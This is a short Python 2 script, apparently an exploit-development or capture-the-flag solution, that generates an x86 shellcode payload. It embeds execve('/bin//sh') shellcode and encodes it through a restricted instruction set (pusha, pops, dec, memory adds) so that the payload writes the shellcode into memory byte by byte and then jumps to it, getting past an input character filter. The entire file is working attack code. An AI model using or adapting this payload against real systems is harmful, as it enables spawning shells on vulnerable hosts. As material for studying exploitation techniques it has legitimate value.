#!/usr/bin/env python

shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
ENDCHAR = "\xff"

# esi is for trash

# memory after pusha: 	edi esi ebp esp ebx edx ecx eax
move_eax_to_ebx = "\x60" + ("\x5b"*8)
move_eax_to_ebp = "\x60" + ("\x5d"*8)
move_eax_to_esi = "\x60" + ("\x5e"*8)
move_eax_to_edi = "\x60" + ("\x5f"*8)

move_ebx_to_edi = "\x60" + ("\x5f"*5) + ("\x5e"*3)
move_ebp_to_ebx = "\x60" + ("\x5b"*3) + ("\x5e"*5)

dec_ebx = "\x4b"
inc_eax = "\x40"

or_bh_with_ff = "\x0a\x7d\x00"      # 0xff comes from [ebp]
mov_bl_to_addr = "\x00\x5d\x00"     # ebp should contain base address
add_bl_to_edi = "\x00\x5f\x00"


# we can put it in bh

def write_bytes(s):
    out = []
    for c in s:
        # set a edi to eax + 0xff00
        deccount = (0xff - ord(c)) + 1
        out += [
            move_eax_to_ebx,
            or_bh_with_ff,
            move_ebx_to_edi,
            
            # generate a value to be written in bh
            move_ebp_to_ebx,
            dec_ebx * deccount,

            # write bh to target address
            add_bl_to_edi,

            # increase eax
            inc_eax,
        ]
    return "".join(out)

out = [
        # 4 null bytes at the start, harmless
        "\x00\x00\x00\x00",

        # write 0xff to addr
        move_eax_to_ebp,
        move_eax_to_ebx,
        dec_ebx,
        mov_bl_to_addr,

        write_bytes(shellcode),
        # execute
        ENDCHAR
    ]

print "".join(out)
